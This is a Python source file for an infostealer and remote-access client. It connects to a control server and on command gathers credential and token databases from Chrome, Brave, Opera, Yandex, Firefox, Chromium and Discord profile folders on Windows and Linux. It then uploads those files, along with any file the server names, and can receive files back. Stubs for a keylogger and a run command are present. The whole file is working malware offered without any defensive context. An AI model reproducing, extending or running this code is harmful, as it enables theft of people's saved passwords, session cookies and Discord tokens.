#!/usr/bin/env/ python3
import os
import platform
import subprocess
import socket
import multiprocessing
import time
import sys

control_address = ("localhost", 8080)

local = os.getenv("LOCALAPPDATA")
roaming = os.getenv("APPDATA")

# windows paths for credentials

paths_win = {
    "Discord": f"{roaming}\\Discord",
    "Discord Canary": f"{roaming}\\discordcanary",
    "Discord PTB": f"{roaming}\\discordptb",
    "Google Chrome": f"{local}\\Google\\Chrome\\User Data\\Default",
    "Opera": f"{roaming}\\Opera Software\\Opera Stable",
    "Brave": f"{local}\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex": f"{local}\\Yandex\\YandexBrowser\\User Data\\Default",
}
try:
    user = (
        subprocess.run("whoami", capture_output=True).stdout.decode("utf-8").strip("\n")
    )
except Exception:
    user = "not linux"

# linux paths for credentials, limited for now cause I can't be bothered
paths_tux = {
    "Firefox": f"/home/{user}/snap/firefox/common/.mozilla/firefox",
    "Chromium": f"/home/{user}/snap/chromium/common/chromium/Default",
    "Discord": f"/home/{user}/.config/discord/Local Storage/leveldb",
}

extensions_db = [".db", ".ldb", ".sqlite", ".sqlite-wal", ".log"]
extensions_full = [".txt", ".ldb", ".sqlite-wal", ".sqlite", ".json", ".db", ".log"]

mode = 0
CID = ""


def Start_Client():
    global mode
    global CID

    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                sock.connect(control_address)
            except ConnectionRefusedError:
                time.sleep(2)
                Start_Client()
            # Giving the client an ID for easy management
            filed = []
            for root, dirs, files in os.walk("."):
                for file in files:
                    filed.append(file)
            if ".CID" not in filed:
                print("no ID")
                sock.send("CID_req".encode())
                CID_r = sock.recv(1024)
                print(CID_r)
                with open(".CID", "w") as CID_f:
                    CID_f.write(CID_r.decode("utf-8"))

            if CID == "":
                CID = open(".CID", "r").read()

            time.sleep(1)
            sock.send(f"heartbeat from {CheckOS()} system with {CID}".encode())
            # sock.close()
        except Exception as E:
            print(E)
            sys.exit(1)

        command = sock.recv(4096)
        if command.__contains__(CID.encode()):
            if command.__contains__(b"creds"):
                command = command.decode("utf-8")
                if command.__contains__("full"):
                    mode = 1
                else:
                    mode = mode

                t = GetBrowserCreds()

                mode = 0

                sock.sendall(f"found {len(t)} files\nDownload(Y/n)".encode())
                time.sleep(2)
                confirmation = sock.recv(1024).decode("utf-8")
                if confirmation.upper() == "N":
                    sock.send("not downloading".encode())
                elif confirmation.upper() == "Y":
                    sock.send("uploading files...".encode())
                    time.sleep(1)
                    UploadFile(t, sock)
                else:
                    sock.send("Invaild operation...".encode())
                continue
            if command.__contains__(b"download"):
                command = command.decode("utf-8")
                filepath = command.split(" ")[3]
                UploadFile(filepath, sock)
                continue
            if command.__contains__(b"file_accept"):
                filename = command.split(b" ")[3]
                DownloadFile(filename, sock)
                continue

        # sock.sendall(cred)
        # print(cred)


def CheckOS():
    os_type = platform.system()
    return os_type


def GetBrowserCreds():
    # checking what OS the program is being run on

    os_type = CheckOS()

    # grabbing creds from different directories based on system
    dbfiles = []
    if os_type == "Linux":
        for item, path in paths_tux.items():
            if not os.path.exists(path):
                continue
            directory = (
                subprocess.run(["ls", path], capture_output=True)
                .stdout.decode("utf-8")
                .split("\n")[0]
            )

            for root, dirs, files in os.walk(os.path.join(path, directory)):
                for file in files:
                    if mode == 1:
                        for extension in extensions_full:
                            if file.endswith(extension):
                                dbfiles.append(os.path.join(root, file))

                    else:
                        for extension in extensions_db:
                            if file.endswith(extension):
                                dbfiles.append(os.path.join(root, file))

    elif os_type == "Darwin":
        pass

    elif os_type == "Windows":
        for item, path in paths_win.items():
            if not os.path.exists(path):
                print("no path... smadge")
                continue
            directory = (
                subprocess.run(["dir", path], capture_output=True)
                .stdout.decode("utf-8")
                .split("\n")[0]
            )

            for root, dirs, files in os.walk(os.path.join(path, directory)):
                for file in files:
                    if mode == 1:
                        for extension in extensions_full:
                            if file.endswith(extension):
                                dbfiles.append(os.path.join(root, file))

                    else:
                        for extension in extensions_db:
                            if file.endswith(extension):
                                dbfiles.append(os.path.join(root, file))

    return dbfiles


def UploadFile(files, sock):
    if isinstance(files, list):
        for file in files:
            try:
                sock.send(f"file: {file}".encode("utf-8"))
                with open(file, "rb") as upload:
                    sock.send(upload.read())
                time.sleep(5)
            except Exception as E:
                sock.send(str(E).encode())
    else:
        try:
            sock.send(files.encode())
            with open(files, "rb") as upload:
                sock.send(upload.read())
        except Exception as E:
            sock.send(str(E).encode())


def DownloadFile(filename, sock):
    file = open(filename.decode("utf-8").replace("/", ""), "wb")
    buffer = b""
    while True:
        data = sock.recv(4096)
        if len(data) < 4096:
            buffer += data
            file.write(buffer)
            file.close()
            break
        buffer += data
    sock.send(f"file {filename} uploaded".encode())


def Run():
    pass


def KeyLogger():
    pass


if __name__ == "__main__":
    try:
        Start_Client()
    except Exception as E:
        # print(E)
        # sock.send(str(E).encode())
        sys.exit(1)
